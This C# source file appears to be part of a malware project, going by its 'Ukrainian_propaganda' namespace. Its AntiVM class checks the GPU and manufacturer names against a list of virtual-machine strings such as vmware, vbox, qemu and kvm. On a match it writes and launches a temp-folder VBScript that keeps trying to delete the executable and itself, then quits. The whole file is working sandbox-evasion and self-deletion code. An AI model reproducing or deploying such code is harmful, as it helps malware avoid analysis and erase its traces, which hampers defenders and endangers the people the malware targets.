using System;
using System.IO;
using System.Reflection;
using static Ukrainian_propaganda.SystemInfo;

namespace Ukrainian_propaganda
{
    class AntiVM
    {
        private static readonly string ExecutablePath = Assembly.GetEntryAssembly().Location;
        private static readonly string TempPath = Path.GetTempPath();
        public static void IsVirtualMachine()
        {
            string gpu = GetGPUName().ToLower();
            string manufacturer = GetComputerManufacturer().ToLower();
            string[] vm_names = new string[]
            {
                "vbox",
                "vmbox",
                "vmware",
                "virtualbox",
                "qemu",
                "thinapp",
                "VMXh",
                "innotek gmbh",
                "tpvcgateway",
                "tpautoconnsvc",
                "kvm",
                "red hat",
                "virtual platform"
            };

            foreach (string name in vm_names)
            {
                if (gpu.Contains(name) || manufacturer.Contains(name))
                {
                    Terminate();
                    Environment.Exit(0);
                }
            }
        }

        public static void Terminate()
        {
            string Body = "Set fso = CreateObject(\"Scripting.FileSystemObject\"): On error resume next: Dim I: I = 0" + Environment.NewLine + "Set File = FSO.GetFile(\"" + ExecutablePath + "\"): Do while I = 0: fso.DeleteFile (\"" + ExecutablePath + "\"): fso.DeleteFile (\"" + TempPath + "\\1.vbs\"): " + Environment.NewLine + "If FSO.FileExists(File) = false Then: I = 1: End If: Loop";
            File.WriteAllText(TempPath + "\\1.vbs", Body, System.Text.Encoding.Default);
            System.Diagnostics.Process.Start(TempPath + "\\1.vbs");
        }
    }
}
